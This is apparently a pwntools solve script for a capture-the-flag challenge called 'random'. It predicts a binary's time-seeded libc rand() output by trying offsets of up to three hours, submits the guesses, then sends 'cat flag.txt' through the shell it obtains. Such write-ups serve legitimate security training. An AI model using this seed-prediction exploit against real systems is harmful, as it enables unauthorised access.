#!/usr/bin/env python3

from pwn import *
from ctypes import *

exe = ELF("./random")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']


def conn():
    if args.REMOTE:
        io = remote("challs.tfcctf.com", 30253)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, gdbscript="""
                    set follow-fork-mode parent
                    b *main+0xd9
               """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    n = 3*60*60
    for i in range(-n, n+1):
        io = conn()
        io.recvuntil(b"Guess my numbers!\n")
        print(i)
        cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
        libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
        time_ret = libc.time(0)-i
        libc.srand(time_ret)

        guesses = []
        for _ in range(10):
            r = libc.rand()
            guesses.append(r)

        for guess in guesses:
            io.sendline(str(guess).encode())

        io.sendline(b"cat flag.txt")
        if b"make it :(" in io.recvline():
            print("BBB")
            io.close()
        else:
            print("AAA")
        io.interactive()


if __name__ == "__main__":
    main()
